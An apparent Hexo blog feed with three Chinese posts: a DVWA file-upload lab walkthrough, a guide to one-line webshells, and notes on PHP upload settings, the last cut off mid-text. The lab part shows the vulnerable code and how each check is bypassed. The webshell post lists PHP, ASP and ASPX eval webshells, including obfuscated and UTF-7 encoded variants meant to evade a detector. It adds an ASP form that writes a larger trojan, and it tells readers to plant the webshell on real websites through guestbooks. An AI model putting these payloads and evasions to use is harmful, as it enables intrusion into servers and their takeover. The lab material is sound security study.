<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-05-13T12:44:14.128Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>DVWA File Upload</title>
    <link href="http://yoursite.com/2020/05/14/DVWA%20File%20Upload/"/>
    <id>http://yoursite.com/2020/05/14/DVWA%20File%20Upload/</id>
    <published>2020-05-14T12:39:06.226Z</published>
    <updated>2020-05-13T12:44:14.128Z</updated>
    
    <content type="html"><![CDATA[<h1 id="DVWA-File-Upload"><a href="#DVWA-File-Upload" class="headerlink" title="DVWA File Upload"></a>DVWA File Upload</h1><p>File Upload，即文件上传。文件上传漏洞通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的。</p><p><a href="https://www.cnblogs.com/0daybug/p/12311087.html" target="_blank" rel="noopener">这是文件上传漏洞很全的一个总结</a></p><p>webshell概念：web指的是在web服务器上，而shell是用脚本语言编写的脚本程序，webshell就是就是web的一个管理工具，可以对web服务器进行操作的权限，也叫webadmin。webshell一般是被网站管理员用于网站管理、服务器管理等等一些用途，但是由于webshell的功能比较强大，可以上传下载文件，查看数据库，甚至可以调用一些服务器上系统的相关命令（比如创建用户，修改删除文件之类的），通常被黑客利用，黑客通过一些上传方式，将自己编写的webshell上传到web服务器的页面的目录下，然后通过页面访问的形式进行入侵，或者通过插入一句话连接本地的一些相关工具直接对服务器进行入侵操作。</p><p><a href="https://www.jianshu.com/p/02aac12e459f" target="_blank" rel="noopener">参考博客</a></p><p>常规的文件上传操作：<br>客户端上传：</p><pre><code>&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;&lt;title&gt;文件上传操作&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;upload.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;    用户名：&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;&lt;br /&gt;    头像：&lt;input type=&quot;file&quot; name=&quot;img&quot;&gt;&lt;br /&gt;    &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>在HTML <form>标签中enctype属性规定在发送到服务器之前应该如何对表单数据进行编码。</p><p>它的值有三种：</p><pre><code>application/x-www-form-urlencoded: 在发送前编码所有字符（默认）multipart/form-data: 不对字符编码。在使用包含文件上传控件的表单时，必须使用该值。text/plain: 空格转换为 &quot;+&quot; 加号，但不对特殊字符编码。</code></pre><p>服务端接收：</p><p>使用$_FILES数组接收参数。</p><p>我们打印$_FILES</p><pre><code>print_r($_FILES);</code></pre><p>发现上传一个文件时的属性有：</p><pre><code>[name] =&gt; feng.jpeg     文件的名称[type] =&gt; image/jpeg     文件的MIME类型[tmp_name] =&gt; C:\Users\Administrator\AppData\Local\Temp\php2007.tmp  文件的临时位置[error] =&gt; 0       文件的错误信息  0 ok      1234 error[size] =&gt; 2859    文件的大小</code></pre><p>文件上传漏洞的利用的条件：<br>1.能够成功上传木马文件<br>2.上传文件必须能够被执行<br>3.上传文件的路径必须可知</p><p><a href="https://www.cnblogs.com/yyxianren/p/11381655.html" target="_blank" rel="noopener">参考博客</a></p><h3 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h3><p><strong>源码：</strong></p><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Where are we going to be writing to? //isset() 函数用于检测变量是否已设置并且非 NULL。    $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;     $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] ); //这段代码是有关文件上传之后的位置的。basename(path,suffix)：path必需。规定要检查的路径。在Windows中，斜线（/）和反斜线（\）都可以用作目录分隔符。在其它环境下是斜线（/）。suffix:可选。规定文件扩展名。如果文件有suffix，则不会输出这个扩展名。    // Can we move the file to the upload folder? 能否可以上传？    if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) { // 判断是否可以上传。move_uploaded_file(file,newloc)：file必需，规定要移动的文件。newloc必需，规定文件的新位置。//move_uploaded_file函数将上传的文件移动到新位置。        // No 即失败        echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;     }     else {         // Yes! 即成功        echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;         //返回文件路径    } } ?&gt; </code></pre><p> move_uploaded_file 函数检查并确保由 file 指定的文件是合法的上传文件（即通过 PHP 的 HTTP POST 上传机制所上传的）。如果文件合法，则将其移动为由 newloc 指定的文件。</p><p>如果 file 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。<br>如果 file 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。</p><p><strong>实战：</strong></p><p>1.这段代码对于上传文件的类型、内容等没有进行任何的过滤检查，直接将文件存储在 “hackable/uploads/“ 路径下。因此我们可以直接上传一个一句话木马文件进行攻击。<br><?php @eval($_POST['1']);?> （php一句话木马）</p><p>上传后出现：../../hackable/uploads/1.php succesfully uploaded!</p><p>浏览器访问（即输入url：127.0.0.1/DVWA-master/hackable/uploads/1.php）确定是否上传成功</p><p>上传成功即可进行下一步。</p><p>2.<a href="https://www.freesion.com/article/6380373568/#22_DVWAhackphp_28" target="_blank" rel="noopener">参考博客</a></p><p>打开中国蚁剑，右键添加数据：URL地址填127.0.0.1/DVWA-master/hackable/uploads/1.php；连接密码写1（因为第一步写的一句话木马post提交的是1）；编码器选chr；点击添加。右键文件管理能看到列表即连接成功。</p><h3 id="medium级别"><a href="#medium级别" class="headerlink" title="medium级别"></a>medium级别</h3><p><strong>源码：</strong></p><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;     $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );     // File information 文件信息（上传的文件）    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ];     $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     // Is it an image? 判断上传的文件是不是图片（是jpeg和png图片且大小小于100000字节）    if( ( $uploaded_type == &quot;image/jpeg&quot; || $uploaded_type == &quot;image/png&quot; ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) ) {         // Can we move the file to the upload folder?我们能否上传文件？         if( !move_uploaded_file( $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ], $target_path ) ) {             // No             echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;         }         else {             // Yes!             echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;             //还是一样会显示路径        }     }     else { //下边是：如果上传的文件不是图片返回的信息        // Invalid file         echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     } } ?&gt; </code></pre><p>多了需要上传图片的条件</p><p><strong>实战：</strong>同样写<?php @eval($_POST['1']);?>,存成2.jpg，上传，用burpsuite拦截把jpg再改成php,打开蚁剑发现文件目录出现了2.jpg跟2.php。<a href="https://www.cnblogs.com/hyq0616-love/p/12661187.html" target="_blank" rel="noopener">参考博客</a></p><h3 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h3><p>源码：</p><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Where are we going to be writing to?     $target_path  = DVWA_WEB_PAGE_TO_ROOT . &quot;hackable/uploads/&quot;;     $target_path .= basename( $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ] );     // File information 文件信息    $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); //这句的意思是将文件的后缀名赋给$uploaded_ext。    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ]; //strrpos函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）；substr函数返回字符串的一部分。//strrpos(string,find,start):string必需。规定被搜索的字符串。find必需。规定要查找的字符.start可选。规定在何处开始搜索。    // Is it an image? 判断图片    if( ( strtolower( $uploaded_ext ) == &quot;jpg&quot; || strtolower( $uploaded_ext ) == &quot;jpeg&quot; || strtolower( $uploaded_ext ) == &quot;png&quot; ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) &amp;&amp;         getimagesize( $uploaded_tmp ) ) { //strtolower函数将所有字符转换为小写；getimagesize函数用于获取图像的大小及相关信息。        // Can we move the file to the upload folder? 同上        if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) {             // No             echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;         }         else {             // Yes!             echo &quot;&lt;pre&gt;{$target_path} succesfully uploaded!&lt;/pre&gt;&quot;;         }     }     else {         // Invalid file         echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     } } ?&gt; </code></pre><p><strong>实战：</strong></p><p>不是对类型做限制，而是对后缀做了白名单限制。并且对图像内容做了检测。上传图片码解决</p><p>1.制作图片马,命令行终端执行。（将代码和图片合为一体）</p><pre><code>copy 1.jpg/b+3.php/a hack.jpg</code></pre><p>2.或者直接bp抓包，修改内容，加上图片头GIF89a</p><ol><li><p>上传1.jpg的木马文件，抓包</p></li><li><p>加上GIF89a的图片头，让其误以为内容是图片</p><p><img src="https://img2020.cnblogs.com/blog/1962254/202005/1962254-20200503155942090-75242379.png" alt="img"></p><p><a href="https://www.cnblogs.com/kbhome/p/12822233.html" target="_blank" rel="noopener">参考博客</a></p></li></ol><h3 id="impossible级别"><a href="#impossible级别" class="headerlink" title="impossible级别"></a>impossible级别</h3><p>源码：</p><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Upload&#39; ] ) ) {     // Check Anti-CSRF token 意为校验token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );     // File information     $uploaded_name = $_FILES[ &#39;uploaded&#39; ][ &#39;name&#39; ];     $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, &#39;.&#39; ) + 1); //返回上传的文件名.后面的字符，即文件类型    $uploaded_size = $_FILES[ &#39;uploaded&#39; ][ &#39;size&#39; ];     $uploaded_type = $_FILES[ &#39;uploaded&#39; ][ &#39;type&#39; ];     $uploaded_tmp  = $_FILES[ &#39;uploaded&#39; ][ &#39;tmp_name&#39; ];     // Where are we going to be writing to?     $target_path   = DVWA_WEB_PAGE_TO_ROOT . &#39;hackable/uploads/&#39;;     //$target_file   = basename( $uploaded_name, &#39;.&#39; . $uploaded_ext ) . &#39;-&#39;;     $target_file   =  md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext;     $temp_file     = ( ( ini_get( &#39;upload_tmp_dir&#39; ) == &#39;&#39; ) ? ( sys_get_temp_dir() ) : ( ini_get( &#39;upload_tmp_dir&#39; ) ) );     $temp_file    .= DIRECTORY_SEPARATOR . md5( uniqid() . $uploaded_name ) . &#39;.&#39; . $uploaded_ext; //这边是重写文件名（在文件名前面加id再整体md5）//将上传的文件进行改名以及确定上传的目录位置。uniqid函数基于以微秒计的当前时间，生成一个唯一的 ID；ini_get函数用于获取一个配置选项的值或者说获取php.ini里的环境变量的值 。sys_get_temp_dir函数用于返回用于临时文件的目录。    // Is it an image? 仍旧限制了条件    if( ( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;jpeg&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; ) &amp;&amp;         ( $uploaded_size &lt; 100000 ) &amp;&amp;         ( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39; ) &amp;&amp;         getimagesize( $uploaded_tmp ) ) {         // Strip any metadata, by re-encoding image (Note, using php-Imagick is recommended over php-GD) 下边是将上传的图片重新编码        if( $uploaded_type == &#39;image/jpeg&#39; ) {             $img = imagecreatefromjpeg( $uploaded_tmp );             imagejpeg( $img, $temp_file, 100); //imagejpeg ( image , filename , quality)//从image图像以filename为文件名创建一个JPEG图像，可选参数quality，范围从 0（最差质量，文件更小）到 100（最佳质量，文件最大）。        }         else {             $img = imagecreatefrompng( $uploaded_tmp );             imagepng( $img, $temp_file, 9);         }         imagedestroy( $img );//imagedestroy函数销毁图像资源 //imagecreatefromjpeg ( filename )函数返回图片文件的图像标识，失败返回false        // Can we move the file to the web root from the temp folder? 意为是否可以将文件从临时目录转移到web根目录。//rename函数重命名文件或目录；getcwd函数用于获取当前的工作目录；        if( rename( $temp_file, ( getcwd() . DIRECTORY_SEPARATOR . $target_path . $target_file ) ) ) {             // Yes!             echo &quot;&lt;pre&gt;&lt;a href=&#39;${target_path}${target_file}&#39;&gt;${target_file}&lt;/a&gt; succesfully uploaded!&lt;/pre&gt;&quot;;         }         else {             // No             echo &#39;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#39;;         }         // Delete any temp files 意为删除所有临时文件。        if( file_exists( $temp_file ) )//file_exists函数用于检查文件或目录是否存在。             unlink( $temp_file ); //unlink函数用于删除文件。    }     else {         // Invalid file 上传的文件不符合规则        echo &#39;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#39;;     } } // Generate Anti-CSRF token generateSessionToken(); //生成token?&gt; </code></pre><p>函数学习：</p><p>substr(string,start,length)<br>函数返回字符串的一部分</p><p>strrpos(string,find,start)<br>函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）</p><p>uniqid(prefix,more_entropy)：prefix可选，为 ID 规定前缀。如果两个脚本恰好在相同的微秒生成 ID，该参数很有用；more_entropy可选，规定位于返回值末尾的更多的熵。</p><p>ini_get( string $varname )：varname必需，配置选项名称。</p><p>ini_get拓展概念：成功是返回配置选项值的字符串，null 的值则返回空字符串。如果配置选项不存在，将会返回 FALSE。<br>注意: 当查询一个 boolean 值 ，一个 off 的 boolean ini 值将会以空字符串或者 “0” 返回；on 的 ini 值会以 “1” 返回。 此函数也会返回 INI 值的文字字符串。<br>注意: 当查询一个内存尺寸的值，许多内存尺寸的 ini 值，类似 upload_max_filesize 是以简写表示法储存在 php.ini 文件里。 ini_get() 会返回 php.ini 文件中储存的确切字符串，而不是它的等量 integer。尝试对这些值使用常规算术运算函数将不会得到预期的结果。 以上例子显示了转换简写表示法为字节的一种方式，和 PHP 源码所做的比较像。<br>注意: ini_get() 无法读取 “array” 的 ini 选项，例如 pdo.dsn.*，在这个例子中会返回 FALSE 。 </p><p>getimagesize()<br>函数用来获取图像的大小和类型<br>可以看到，Impossible级别的代码对上传文件进行了重命名（为md5值，导致%00截断无法绕过过滤规则），加入Anti-CSRF token防护CSRF攻击，同时对文件的内容作了严格的检查，导致攻击者无法上传含有恶意脚本的文件。</p><p>扩展：</p><p>源码中使用了一个非常不安全的的函数：<strong>getimagesize()</strong></p><p>getimagesize()函数会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的。</p><p>getimagesize()返回结果中有文件大小和文件类型，如果用这个函数来获取类型，从而判断是否是图片的话，会存在问题。因为图片头可以被伪造，我们完全可以通过伪造正确的图片头来绕过它对图片类型的检查。</p><p>这就是图片的十六进制，前几位都是一样的</p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200424143107947-1812469690.png" alt="img"></p><p><img src="https://img2020.cnblogs.com/blog/1375459/202004/1375459-20200424143459251-1601347052.png" alt="img"></p><p>按照这样的逻辑，我们就可以去伪造一个假图片，让函数以为我们这就是图片，达到绕过的目的。</p><ul><li>方法1 直接伪造头部GIF89A</li><li>方法2 CMD：copy /b test.png+munma.php hack.png</li><li>方法3 使用GIMP（开源的图片修改软件），通过增加备注，写入执行命令。</li></ul><p>但是，即使我们可以根据上述方法绕过函数getimagesize()，我们也绕不过imagecreatefromjpeg ( filename )、imagejpeg ( image , filename , quality)、imagedestroy( img )等几个函数对我们上传图片的重塑。所以，Impossible等级的代码是比较安全的。<a href="https://blog.csdn.net/weixin_43915842/article/details/90183305" target="_blank" rel="noopener">参考博客1</a>   <a href="https://www.cnblogs.com/zhengna/p/12764718.html" target="_blank" rel="noopener">参考博客2</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DVWA-File-Upload&quot;&gt;&lt;a href=&quot;#DVWA-File-Upload&quot; class=&quot;headerlink&quot; title=&quot;DVWA File Upload&quot;&gt;&lt;/a&gt;DVWA File Upload&lt;/h1&gt;&lt;p&gt;File Upload，即文
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>一句话木马的原理及利用</title>
    <link href="http://yoursite.com/2020/05/14/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/05/14/%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%A9%E7%94%A8/</id>
    <published>2020-05-14T12:38:58.625Z</published>
    <updated>2020-05-13T07:19:39.678Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一句话木马的原理及利用"><a href="#一句话木马的原理及利用" class="headerlink" title="一句话木马的原理及利用"></a>一句话木马的原理及利用</h1><h3 id="一句话木马的举例说明："><a href="#一句话木马的举例说明：" class="headerlink" title="一句话木马的举例说明："></a>一句话木马的举例说明：</h3><p>黑客在注册信息的电子邮箱或者个人主页等中插入类似如下代码：<br>&lt;%execute request(“value”)%&gt;<br>其中value是值，所以你可以更改自己的值，前面的request就是获取这个值<br>&lt;%eval request(“value”)%&gt;(现在比较多见的，而且字符少，对表单字数有限制的地方特别的实用)<br>当知道了数据库的URL，就可以利用本地一张网页进行连接得到Webshell。（不知道数据库也可以，只要知道&lt;%eval request(“value”)%&gt;这个文件被插入到哪一个ASP文件里面就可以了。）<br>这就被称为一句话木马，它是基于B/S结构的。</p><h3 id="一句话木马的工作原理："><a href="#一句话木马的工作原理：" class="headerlink" title="一句话木马的工作原理："></a>一句话木马的工作原理：</h3><p>“一句话木马”服务端（本地的html提交文件）<br>就是我们要用来插入到asp文件中的asp语句，（不仅仅是以asp为后缀的数据库文件），该语句将回为触发，接收入侵者通过客户端提交的数据，执行并完成相应的操作，服务端的代码内容为   &lt;%execute request(“value”)%&gt;   其中value可以自己修改</p><p>“一句话木马”客户端（远程服务器上被插入一句话的asp文件）<br>用来向服务端提交控制数据的，提交的数据通过服务端构成完整的asp功能语句并执行，也就是生成我们所需要的asp木马文件</p><p>现在先假设在远程主机的TEXT.ASP(客户端）中已经有了&lt;%execute request(“value”)%&gt;这个语句.)在ASP里&lt;%execute …………”)%&gt;意思是执行省略号里的语句.那么如果我写进我们精心构造的语句,它也是会帮我们执行的.就按照这上面的思路,我们就可以在本地构造一个表单内容如下:(//为注释)</p><pre><code>&lt;form action=http://主机路径/TEXT.asp method=post&gt;&lt;textarea name=value cols=120 rows=10 width=45&gt;set lP=server.createObject(&quot;Adodb.Stream&quot;)//建立流对象lP.Open //打开lP.Type=2 //以文本方式lP.CharSet=&quot;gb2312&quot; //字体标准lP.writetext request(&quot;newvalue&quot;)lP.SaveToFile server.mappath(&quot;newmm.asp&quot;),2 //将木马内容以覆盖文件的方式写入newmm.asp，2就是已覆 盖的方式lP.Close //关闭对象set lP=nothing //释放对象response.redirect &quot;newmm.asp&quot; //转向newmm.asp&lt;/textarea&gt;&lt;textarea name=newvalue cols=120 rows=10 width=45&gt;添入生成木马的内容&lt;/textarea&gt;&lt;BR&gt;&lt;center&gt;&lt;br&gt;&lt;input type=submit value=提交&gt;&lt;/form&gt;</code></pre><p>表单的作用就是把我们表单里的内容提交到远程主机的TEXT.ASP这个文件.然后因为TEXT.ASP里有&lt;%execute request(“value”)%&gt;这句,那么这句代码就会执行我们从表单里传来的内容哦.(表单名必须和&lt;%execute request(“value”)%&gt;里的VALUE一样,就是我用蓝色标记的那两处,必须相等)</p><p>说到这里大家是不是清楚了.我们构造了两个表单,第一个表单里的代码是文件操作的代码(就是把第二个表单内的内容写入在当前目录下并命名为newvalue.ASP的这么一段操作的处理代码)那么第二个表单当然就是我们要写入的马了.</p><p>具体的就是下面这一段:</p><pre><code>set lP=server.createObject(&quot;Adodb.Stream&quot;)//建立流对象lP.Open //打开lP.Type=2 //以文本方式lP.CharSet=&quot;gb2312&quot; //字体标准lP.writetext request(&quot;newvalue&quot;)lP.SaveToFile server.mappath(&quot;newvalue.asp&quot;),2 //将木马内容以覆盖文件的方式写入newmm.asp，2就是已覆 盖的方式lP.Close //关闭对象set lP=nothing //释放对象response.redirect &quot;newmm.asp&quot; //转向newmm.asp</code></pre><p>这样的话第二个表单的名字必须和lP.writetext request(“newvalue”) 里的Newvalue一样,就是我用红色标注的那两处.<br>至此只要服务器有写的权限你表单所提交的大马内容就会被写入到newmm.asp中。即newmm.asp为我们的shell地址。</p><h3 id="常用写法："><a href="#常用写法：" class="headerlink" title="常用写法："></a>常用写法：</h3><p>asp一句话木马：&lt;%execute(request(“value”))%&gt;<br>php一句话木马：<?php @eval($_POST[value]);?><br>aspx一句话木马：<br>　　&lt;%@ Page Language=”Jscript”%&gt;<br>　　&lt;%eval(Request.Item[“value”])%&gt;<br>其他一句话木马：</p><pre><code>&lt;%eval request(&quot;value&quot;)%&gt;　　&lt;%execute request(&quot;value&quot;)%&gt;　　&lt;%execute(request(&quot;value&quot;))%&gt;　　&lt;%If Request(&quot;value&quot;)&lt;&gt;&quot;&quot; Then Execute(Request(&quot;value&quot;))%&gt;　　&lt;%if request (&quot;value&quot;)&lt;&gt;&quot;&quot;then session(&quot;value&quot;)=request(&quot;value&quot;):end if:if session(&quot;value&quot;)&lt;&gt;&quot;&quot; then execute session(&quot;value&quot;)%&gt;　　&lt;SCRIPT language=VBScript runat=&quot;server&quot;&gt;execute request(&quot;value&quot;)&lt;/SCRIPT&gt;　　&lt;%@ Page Language=&quot;Jscript&quot;%&gt;　　&lt;%eval(Request.Item[&quot;value&quot;],&quot;unsafe&quot;);%&gt; </code></pre><p>可以躲过雷客图的一句话木马：</p><pre><code>　　&lt;%　　set ms = server.CreateObject(&quot;MSScriptControl.ScriptControl.1&quot;)　　ms.Language=&quot;VBScript&quot;　　ms.AddObject &quot;Response&quot;, Response　　ms.AddObject &quot;request&quot;, request　　ms.ExecuteStatement(&quot;ev&quot;&amp;&quot;al(request(&quot;&quot;value&quot;&quot;))&quot;)　　%&gt;</code></pre><p>不用’&lt;,&gt;’的asp一句话木马：</p><p>　　<script language=VBScript runat=server>execute request("value")</script><br>不用双引号的一句话木马：&lt;%eval request(chr(35))%&gt;<br>UTF-7编码加密:<br>&lt;%@ codepage=65000%&gt;&lt;% response.Charset=”936″%&gt;&lt;%e+j-x+j-e+j-c+j-u+j-t+j-e+j-(+j-r+j-e+j-q+j-u+j-e+j-s+j-t+j-(+j-+ACI-#+ACI)+j-)+j-%&gt;</p><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><p>首先,找到数据库是asp格式的网站,然后,以留言板,或者发表文章的方式,把一句话添加到asp数据库，或者加进asp网页.<br>记住!我们的目的是把一句话&lt;%execute request(“value”)%&gt;添加到数据库,无论任何方式!<br>然后打开客户端(就是你电脑上面的那个htm文件),填上加入了一句话的asp文件,或者是asp网页,然后进入此网站服务器。</p><h3 id="使用环境："><a href="#使用环境：" class="headerlink" title="使用环境："></a>使用环境：</h3><p>1.服务器的来宾账户有写入权限<br>2.已知数据库地址且数据库格式为asa或asp<br>3.在数据库格式不为asp或asa的情况下，如果能将一句话插入到asp文件中.</p><p><a href="https://www.cnblogs.com/milantgh/p/3629199.html" target="_blank" rel="noopener">参考博客</a></p><p><a href="https://baike.baidu.com/item/一句话木马/1845646?fr=aladdin" target="_blank" rel="noopener">参考网址</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一句话木马的原理及利用&quot;&gt;&lt;a href=&quot;#一句话木马的原理及利用&quot; class=&quot;headerlink&quot; title=&quot;一句话木马的原理及利用&quot;&gt;&lt;/a&gt;一句话木马的原理及利用&lt;/h1&gt;&lt;h3 id=&quot;一句话木马的举例说明：&quot;&gt;&lt;a href=&quot;#一句话木马的
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>文件上传原理</title>
    <link href="http://yoursite.com/2020/05/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2020/05/14/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%8E%9F%E7%90%86/</id>
    <published>2020-05-14T12:38:51.321Z</published>
    <updated>2020-05-13T12:47:43.850Z</updated>
    
    <content type="html"><![CDATA[<h1 id="文件上传原理"><a href="#文件上传原理" class="headerlink" title="文件上传原理"></a>文件上传原理</h1><p>文件上传：因为浏览器本身的限制，浏览器是不能直接操作文件系统的，需要通过浏览器所暴露出来的统一接口，由用户主动授权发起来访问文件动作，然后读取文件内容进指定内存里，最后执行提交请求操作，将内存里的文件内容数据上传到服务端，最后服务端解析前端传来的数据信息后存入文件里。</p><h4 id="PHP文件上传原理：参考博客"><a href="#PHP文件上传原理：参考博客" class="headerlink" title="PHP文件上传原理：参考博客"></a>PHP文件上传原理：<a href="https://www.cnblogs.com/promiseslc/p/8365986.html" target="_blank" rel="noopener">参考博客</a></h4><p>1、文件上传原理</p><p>　　将客户端的文件上传到服务器，再将服务器的临时文件上传到指定目录</p><p>2、客户端配置</p><ul><li>提交表单</li><li>表单的发送方式为post</li><li>添加enctype=”multipart/form-data”</li></ul><p>3、服务器端配置</p><ul><li>file_uploads = On，支持HTTP上传</li><li>uoload_tmp_dir = ，临时文件保存目录</li><li>upload_max_filesize = 2M，允许上传文件的最大值</li><li>max_file_uploads = 20 ，允许一次上传到的最大文件数</li><li>post_max_size = 8M，post方式发送数据的最大值</li><li>max_execution_time = -1，设置了脚本被解析器终止之前允许的最大执行时间，单位为秒，防止程序写的不好而占尽服务器资源。-1代表无穷</li><li>max_input_time = 60 ，脚本解析输入数据允许的最大时间，单位为秒</li><li>max_input_nesting_level = 64 ，设置输入变量的嵌套深度</li><li>max_input_vars_ = 1000，接受多少输入的变量（限制分别应用于$_GET、$_POST和$_COOKIE超全局变量，将会导致E_WARNING的产生，更多的输入变量将会从请求中截断。</li><li>memory_limit = 128M，最大单线程的独立内存使用量。也就是一个web请求，给予线程最大的内存使用量的定义</li></ul><p>4、错误信息说明</p><p>1）UPLOAD_ERR_OK：其值为0，没有错误发生，文件上传成功</p><p>2）UPLOAD_ERR_INI_SIZE：其值为1，上传的文件超过了php.ini中upload_max_filesize选项限制的值</p><p>3）UPLOAD_ERR_FORM_SIZE：其值为2，上传文件的大小超过了HTML表单中MAX_FILE_SIZE选项指定的值</p><p>4）UPLOAD_ERR_PARTIAL：其值为3，文件只有部分被上传</p><p>5）UPLOAD_ERR_NO_FILE：其值为4，没有文件被上传</p><p>6）UPLOAD_ERR_NO_TMP_DIR：其值为6，找不到临时文件夹</p><p>7）UPLOAD_ERR_CANT_WRITE：其值为7，文件写入失败</p><p>8）UPLOAD_ERR_EXTENSION：其值为8，上传的文件被PHP扩展程序中断</p><p>5、客户端限制</p><ul><li><p>通过表单隐藏域限制文件上传文件的最大值</p><pre><code>&lt;input type=&#39;hidden&#39; name=&#39;MAX_FILE_SIZE&#39; VALUE=&#39;字节数&#39; /&gt;</code></pre></li><li><p>通过accept属性限制上传文件类型</p><pre><code>&lt;input type=&#39;file&#39; name=&#39;myFile&#39; accept=&#39;文件的MIME类型&#39; /&gt;</code></pre></li></ul><p>6、在客户端的限制，用户可在网页上修改代码后上传，故无实际意义。应在服务器端加以限制</p><p>1）限制上传文件的大小</p><p>2）限制上传文件类型</p><p>3）检测是否为真实图片类型</p><p>4）检测是否为HTTP POST方式上传</p><h4 id="HTTP文件上传的基本原理："><a href="#HTTP文件上传的基本原理：" class="headerlink" title="HTTP文件上传的基本原理："></a>HTTP文件上传的基本原理：</h4><p>使用html 的<input type="file" name="xxx"> 标签，提交form 的几个属性必须为： method=post  encType=multipart/form-data;<br>method 属性必须设为post的原因是：值不是放在URL之后传递到服务器的；<br>encType属性：这个属性管理的是表单的MIME编码<br>几个属性详解：<br>         application/x-www-form-urlencoded   在发送前编码所有字符（默认）<br>       multipart/form-data  不对字符编码，在使用包含文件上传控件的表单时，必须使用该值；对于“multipart/form-data”类型的form表单，浏览器上传的实体内 容中的每个表单字段元素的数据之间用字段分隔界线进行分割，两个分隔界线间的内容称为一个分区，每个分区中的内容可以被看作两部分，一部分是对表单字段元 素进行描述的描述头，另外一部是表单字段元素的主体内容<br>       text/plain 